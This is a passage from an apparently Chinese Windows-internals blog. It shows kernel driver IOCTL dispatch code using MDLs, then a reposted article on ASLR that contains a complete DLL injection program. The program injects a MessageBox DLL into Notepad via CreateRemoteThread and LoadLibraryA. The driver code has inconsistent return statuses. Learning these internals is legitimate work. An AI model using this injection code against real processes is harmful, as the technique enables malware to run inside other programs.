title="IO派遣例程"></a>IO派遣例程</h3><ol><li>初始化I&#x2F;O控制码（<code>IoControlCode</code>）、输入和输出缓冲区的大小（<code>InputSize</code>和<code>OutputSize</code>），以及状态变量（<code>Status</code>）。调用<code>IoGetCurrentIrpStackLocation</code>获取当前IRP的堆栈位置，以便访问其中的参数。</li><li>函数使用<code>switch</code>语句根据IRP中的IO控制码的子功能码（<code>IoControlCode</code>）分别处理读写请求（<code>DEVICE_IRP_READ</code>和<code>DEVICE_IRP_WRITE</code>）。<ul><li>对于读请求（<code>DEVICE_IRP_READ</code>），函数尝试从MDL（内存描述列表）获取输入缓冲区地址，并将一段预定义的文本复制到系统缓冲区中作为输出。</li><li>对于写请求（<code>DEVICE_IRP_WRITE</code>），函数从系统缓冲区读取输入数据，并尝试将一段预定义的文本复制到通过MDL获取的输出缓冲区中。</li><li>最后都要完成IO请求（<code>IoCompleteRequest</code>），并对IOSB成员进行设置。</li></ul></li></ol><p>除了“缓冲区”方式读写设备外，另外一种方式是直接方式读写设备。这种方式需要创建完设备对象后， 在设置设备属性的时候，设置为DO_DIRECT_IO，而不是设置DO_BUFFERED_IO属性。操作系统先将用户模式的地址锁定后，操作系统用内存描述符表（MDL数据结构）记录这段内存。</p><p><img src="/.io//image-20240206155839302.png" alt="image-20240206155839302"></p><p>MDL记录这段虚拟内存，这段虚拟内存的大小存储在mdl-&gt;ByteCount里，这段虚拟内存的第一个页地址是 mdl-&gt;StartVa，这段虚拟内存的首地址对于第一个页地址的偏移量是mdl-&gt;ByteOffset。因此，这段虚拟 内存的首地址应该是mdl-&gt;StartVa+mdl-&gt;ByteOffset。DDK提供了几个宏方便程序员得到这几个数值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MmGetMdlByteCount(Mdl) ((Mdl)-&gt;ByteCount) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MmGetMdlByteOffset(Mdl) ((Mdl)-&gt;ByteOffset) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MmGetMdlVirtualAddress(Mdl) \ ((PVOID) ((PCHAR) ((Mdl)-&gt;StartVa) + (Mdl)-&gt;ByteOffset))</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoDispatchControl</span><span class="params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//Sure it&#x27;s our driver</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果不进入If直接完成Irp</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>)   <span class="comment">//省略了判断是否为自己的驱动</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == Irp)</span><br><span class="line">            <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">        BOOLEAN IsOk = FALSE;</span><br><span class="line">        ULONG IoControlCode = <span class="number">0</span>;</span><br><span class="line">        ULONG InputSize = <span class="number">0</span>;</span><br><span class="line">        ULONG OutputSize = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        PIO_STACK_LOCATION IrpStackLocation = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            IrpStackLocation = <span class="built_in">IoGetCurrentIrpStackLocation</span>(Irp);</span><br><span class="line">            IoControlCode = IrpStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;   <span class="comment">//获得子功能码   </span></span><br><span class="line">            InputSize = IrpStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">            OutputSize = IrpStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (IoControlCode)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> DEVICE_IRP_READ:</span><br><span class="line">            &#123;</span><br><span class="line">                PVOID InputBuffer = <span class="literal">NULL</span>;</span><br><span class="line">                PVOID OutputBuffer = <span class="literal">NULL</span>;</span><br><span class="line">                InputBuffer = <span class="built_in">MmGetSystemAddressForMdlSafe</span>(Irp-&gt;MdlAddress, NormalPagePriority);;</span><br><span class="line">                OutputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">                <span class="type">size_t</span> v7 = (<span class="built_in">wcslen</span>(<span class="string">L&quot;[B]--&gt;Read&quot;</span>) + <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span> (InputBuffer != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">DbgPrint</span>(<span class="string">&quot;[B]---&gt; 获取到的输入缓冲区为: %ws\r\n&quot;</span>, InputBuffer);</span><br><span class="line">                    <span class="built_in">RtlCopyMemory</span>(OutputBuffer, <span class="string">L&quot;[B]--&gt;Read&quot;</span>, v7);</span><br><span class="line">                    <span class="built_in">DbgPrint</span>(<span class="string">&quot;[B]---&gt; 设置的输出缓冲区为: %ws\r\n&quot;</span>, OutputBuffer);</span><br><span class="line">                    Irp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">                    Irp-&gt;IoStatus.Information = v7;</span><br><span class="line">                    <span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);   <span class="comment">//完成请求</span></span><br><span class="line">                    <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> DEVICE_IRP_WRITE:</span><br><span class="line">            &#123;</span><br><span class="line">                PVOID InputBuffer = <span class="literal">NULL</span>;</span><br><span class="line">                PVOID OutputBuffer = <span class="literal">NULL</span>;</span><br><span class="line">                InputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">                OutputBuffer = <span class="built_in">MmGetSystemAddressForMdlSafe</span>(Irp-&gt;MdlAddress, NormalPagePriority);;</span><br><span class="line">                <span class="type">size_t</span> v7 = (<span class="built_in">wcslen</span>(<span class="string">L&quot;[B]--&gt;Write&quot;</span>) + <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span> (InputBuffer != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">DbgPrint</span>(<span class="string">&quot;[B]---&gt; 获取到的输入缓冲区为: %ws\r\n&quot;</span>, InputBuffer);   <span class="comment">//显示给你的数据</span></span><br><span class="line">                    <span class="built_in">RtlCopyMemory</span>(OutputBuffer, <span class="string">L&quot;[B]--&gt;Write&quot;</span>, v7);                  <span class="comment">//构建返回的数据</span></span><br><span class="line">                    <span class="built_in">DbgPrint</span>(<span class="string">&quot;[B]---&gt; 设置的输出缓冲区为: %ws\r\n&quot;</span>, OutputBuffer);    <span class="comment">//显示返回的数据                    irp-&gt;IoStatus.Status = STATUS_SUCCESS;</span></span><br><span class="line">                    Irp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">                    Irp-&gt;IoStatus.Information = v7;       <span class="comment">//Irp中的IoStatusBlock</span></span><br><span class="line">                    <span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);   <span class="comment">//完成请求</span></span><br><span class="line">                    <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!IsOk)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//请求码不是上面的情况</span></span><br><span class="line">            Irp-&gt;IoStatus.Status = Status;   <span class="comment">//Irp中的IoStatusBlock</span></span><br><span class="line">            Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);</span><br><span class="line">            <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Irp-&gt;IoStatus.Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="默认派遣例程"><a href="#默认派遣例程" class="headerlink" title="默认派遣例程"></a>默认派遣例程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">PassThroughDispatch</span><span class="params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Irp-&gt;IoStatus.Status = STATUS_SUCCESS;     <span class="comment">//LastError()</span></span><br><span class="line">    Irp-&gt;IoStatus.Information = <span class="number">0</span>;             <span class="comment">//ReturnLength </span></span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);   <span class="comment">//将Irp返回给Io管理器</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="驱动卸载"><a href="#驱动卸载" class="headerlink" title="驱动卸载"></a>驱动卸载</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(IN PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PDEVICE_OBJECTv1;</span><br><span class="line">PDEVICE_OBJECTv2;</span><br><span class="line">v1 = DriverObject-&gt;DeviceObject;</span><br><span class="line">UNICODE_STRING LinkName;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;LinkName, <span class="string">L&quot;\\??\\DriverB&quot;</span>);</span><br><span class="line"><span class="built_in">IoDeleteSymbolicLink</span>(&amp;LinkName);</span><br><span class="line"><span class="keyword">while</span> (v1 != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//删除符号链接</span></span><br><span class="line"></span><br><span class="line">v2 = v1-&gt;NextDevice;</span><br><span class="line"><span class="built_in">IoDeleteDevice</span>(v1);</span><br><span class="line">v1 = v2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？</title>
      <link href="/2024/02/04/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9C%A8ASLR%E6%9C%BA%E5%88%B6%E4%B8%8BDLL%E6%96%87%E4%BB%B6%E5%9C%A8%E4%B8%8D%E5%90%8C%E8%BF%9B%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%9F%BA%E5%9D%80%E7%9B%B8%E5%90%8C%EF%BC%9F/"/>
      <url>/2024/02/04/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9C%A8ASLR%E6%9C%BA%E5%88%B6%E4%B8%8BDLL%E6%96%87%E4%BB%B6%E5%9C%A8%E4%B8%8D%E5%90%8C%E8%BF%9B%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%9F%BA%E5%9D%80%E7%9B%B8%E5%90%8C%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？"><a href="#为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？" class="headerlink" title="为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？"></a><a href="https://www.cnblogs.com/zyorca/p/17841452.html">为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？</a></h2><p><strong>本篇文章为转载内容，单击标题进入原作者地址。若转载行为有侵权，请联系删除。</strong></p><h1 id="1-DLL-注入实现"><a href="#1-DLL-注入实现" class="headerlink" title="1. DLL 注入实现"></a>1. DLL 注入实现</h1><p>以下是实现 DLL注入的简要步骤：</p><p>1.1 打开 Visual Studio，并创建一个新的 DLL 项目。</p><p>1.2 在”dllmain.cpp” 添加以下的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"> <span class="number">3</span> </span><br><span class="line"> <span class="number">4</span> <span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="number">5</span>                        DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="number">6</span>                        LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="number">7</span>                      )</span></span></span><br><span class="line"><span class="function"> 8 </span>&#123;</span><br><span class="line"> <span class="number">9</span>     <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line"><span class="number">10</span>     &#123;</span><br><span class="line"><span class="number">11</span>     <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="number">12</span>         <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;您的进程已被注入&quot;</span>, <span class="string">&quot;注入警告&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">13</span>         <span class="keyword">break</span>;</span><br><span class="line"><span class="number">14</span>     <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="number">15</span>         <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;您的进程已被注入&quot;</span>, <span class="string">&quot;注入警告&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">16</span>         <span class="keyword">break</span>;</span><br><span class="line"><span class="number">17</span>     <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="number">18</span>         <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;您的进程已被注入&quot;</span>, <span class="string">&quot;注入警告&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">19</span>         <span class="keyword">break</span>;</span><br><span class="line"><span class="number">20</span>     <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="number">21</span>         <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;您的进程已被注入&quot;</span>, <span class="string">&quot;注入警告&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">22</span>         <span class="keyword">break</span>;</span><br><span class="line"><span class="number">23</span>     &#125;</span><br><span class="line"><span class="number">24</span>     <span class="keyword">return</span> TRUE;</span><br><span class="line"><span class="number">25</span> &#125;</span><br></pre></td></tr></table></figure><p>1.3 生成 DLL 文件，得到一个名为 “InjectDll.dll” 的 DLL文件。</p><p>1.4 运行以下代码，将 DLL文件注入到记事本进程中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> </span><br><span class="line"> <span class="number">4</span> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> 5 </span>&#123;</span><br><span class="line"> <span class="number">6</span>     <span class="comment">// 获取目标进程的句柄</span></span><br><span class="line"> <span class="number">7</span>     HWND hWnd = <span class="built_in">FindWindow</span>(<span class="literal">NULL</span>, <span class="string">L&quot;无标题 - Notepad&quot;</span>);</span><br><span class="line"> <span class="number">8</span>     <span class="keyword">if</span> (hWnd == <span class="literal">NULL</span>) &#123;</span><br><span class="line"> <span class="number">9</span>         <span class="built_in">printf</span>(<span class="string">&quot;未找到目标进程\n&quot;</span>);</span><br><span class="line"><span class="number">10</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">11</span>     &#125;</span><br><span class="line"><span class="number">12</span> </span><br><span class="line"><span class="number">13</span>     DWORD processId;</span><br><span class="line"><span class="number">14</span>     <span class="built_in">GetWindowThreadProcessId</span>(hWnd, &amp;processId);</span><br><span class="line"><span class="number">15</span>     HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, processId);</span><br><span class="line"><span class="number">16</span>     <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">17</span>         <span class="built_in">printf</span>(<span class="string">&quot;无法打开目标进程\n&quot;</span>);</span><br><span class="line"><span class="number">18</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">19</span>     &#125;</span><br><span class="line"><span class="number">20</span> </span><br><span class="line"><span class="number">21</span>     <span class="comment">// 在目标进程中分配内存</span></span><br><span class="line"><span class="number">22</span>     LPVOID pRemoteBuffer = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="number">23</span>     <span class="keyword">if</span> (pRemoteBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">24</span>         <span class="built_in">printf</span>(<span class="string">&quot;无法在目标进程中分配内存\n&quot;</span>);</span><br><span class="line"><span class="number">25</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">26</span>     &#125;</span><br><span class="line"><span class="number">27</span> </span><br><span class="line"><span class="number">28</span>     <span class="comment">// 将DLL路径写入目标进程</span></span><br><span class="line"><span class="number">29</span>     <span class="type">char</span> dllPath[] = <span class="string">&quot;E:\\Test\\InjectDll.dll&quot;</span>;</span><br><span class="line"><span class="number">30</span>     <span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteBuffer, dllPath, <span class="built_in">sizeof</span>(dllPath), <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="number">31</span>         <span class="built_in">printf</span>(<span class="string">&quot;无法写入目标进程内存\n&quot;</span>);</span><br><span class="line"><span class="number">32</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">33</span>     &#125;</span><br><span class="line"><span class="number">34</span> </span><br><span class="line"><span class="number">35</span>     <span class="comment">// 获取LoadLibrary函数的地址</span></span><br><span class="line"><span class="number">36</span>     HMODULE hKernel32 = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="number">37</span>     <span class="keyword">if</span> (hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">38</span>         <span class="built_in">printf</span>(<span class="string">&quot;未找到kernel32.dll\n&quot;</span>);</span><br><span class="line"><span class="number">39</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">40</span>     &#125;</span><br><span class="line"><span class="number">41</span> </span><br><span class="line"><span class="number">42</span>     FARPROC pLoadLibrary = <span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="number">43</span>     <span class="keyword">if</span> (pLoadLibrary == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">44</span>         <span class="built_in">printf</span>(<span class="string">&quot;未找到LoadLibrary函数\n&quot;</span>);</span><br><span class="line"><span class="number">45</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">46</span>     &#125;</span><br><span class="line"><span class="number">47</span> </span><br><span class="line"><span class="number">48</span>     <span class="comment">// 在目标进程中调用LoadLibrary函数加载DLL</span></span><br><span class="line"><span class="number">49</span>     HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">50</span>     <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">51</span>         <span class="built_in">printf</span>(<span class="string">&quot;无法在目标进程中创建远程线程\n&quot;</span>);</span><br><span class="line"><span class="number">52</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">53</span>     &#125;</span><br><span class="line"><span class="number">54</span> </span><br><span class="line"><span class="number">55</span>     <span class="built_in">printf</span>(<span class="string">&quot;DLL注入成功\n&quot;</span>);</span><br><span class="line"><span class="number">56</span> </span><br><span class="line"><span class="number">57</span>     <span class="comment">// 等待远程线程退出</span></span><br><span class="line"><span class="number">58</span>     <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="number">59</span> </span><br><span class="line"><span class="number">60</span>     <span class="comment">// 清理资源</span></span><br><span class="line"><span class="number">61</span>     <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="number">62</span>     <span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="number">63</span>     <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="number">64</span> </span><br><span class="line"><span class="number">65</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">66</span> &#125;</span><br></pre></td></tr></table></figure><p>总结一下 Dll 注入步骤</p><ul><li>定位目标进程：使用Windows API函数（如FindWindow）或其他技术来获取目标进程的句柄或进程ID；</li><li>打开目标进程：使用OpenProcess函数打开目标进程，获取进程的句柄，以便后续操作；</li><li>在目标进程中分配内存：使用VirtualAllocEx函数在目标进程中分配一块内存，用于存储DLL路径或其他数据；</li><li>将DLL路径写入目标进程：使用WriteProcessMemory函数将DLL路径或其他数据写入目标进程的内存空间；</li><li>获取函数地址：获取所需函数（例如LoadLibrary）在目标进程所加载的模块中的地址，通常使用GetModuleHandle和GetProcAddress函数；</li><li>在目标进程中创建远程线程：使用CreateRemoteThread函数在目标进程中创建一个远程线程，该线程执行加载DLL的函数，并将DLL路径作为参数传递；</li><li>等待远程线程退出：使用WaitForSingleObject函数等待远程线程退出，确保注入操作完成；</li><li>清理资源：关闭句柄、释放内存等，以确保不会产生资源泄漏。</li></ul><h1 id="2-为什么在ASLR机制下DLL文件在不同进程中加载的基址相同"><a href="#2-为什么在ASLR机制下DLL文件在不同进程中加载的基址相同" class="headerlink" title="2. 为什么在ASLR机制下DLL文件在不同进程中加载的基址相同"></a>2. 为什么在ASLR机制下DLL文件在不同进程中加载的基址相同</h1><h2 id="2-1-ALSR"><a href="#2-1-ALSR" class="headerlink" title="2.1. ALSR"></a>2.1. ALSR</h2><p>ASLR（Address Space Layout Randomization）是一种用于增加系统安全性的技术，它通过随机化内存地址的分配，使攻击者更难以利用已知的内存布局漏洞进行攻击。实际上ASLR的概念在Windows XP时代就已经提出来了，只不过XP上面的ASLR功能很有限，只是对PEB和TEB进行了简单的随机化处理，而对于模块的加载基址没有进行随机化处理，直到Windows Vista出现后，ASLR才真正开始发挥作用。</p><p>微软从Visual Studio 2005 SP1开始加入了&#x2F;dynamicbase链接选项使编译好的程序支持随机基址，只需要在编译程序的时候启用&#x2F;dynmicbase链接选项。（Visual Studio 2022 可以在项目属性中设置：配置属性——链接器——高级——随机基址）</p><p><img src="/.io//1700313198128-26c68044-e1a0-4fb0-9ae3-be09d967e8e0.png" alt="img"></p><p>PE文件中IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE值为1，则说明该 PE文件支持ASLR，如下图所示。</p><p><img src="/.io//1700314676096-75eb5123-70ad-4969-ae1e-7622cd467747.png" alt="img"></p><p>ALSR 会随机化的地址包括：</p><ul><li>堆地址</li><li>栈地址</li><li>PE文件加载基址</li><li>PEB和TEB地址</li></ul><p>ALSR 机制能保证在每次系统重启后，系统DLL文件在进程中的加载基址不会是默认的地址0x10000000（EXE文件的默认加载基址是0x00400000），而是一个随机的地址。系统重启后这个加载基址会再次变化，ASLR的出现使得shellcode中的关键跳转只能在系统重启前，甚至只有程序的本次运行时才能执行，这使得exploit的难度大大增加。在ALSR开启的状态下，DLL 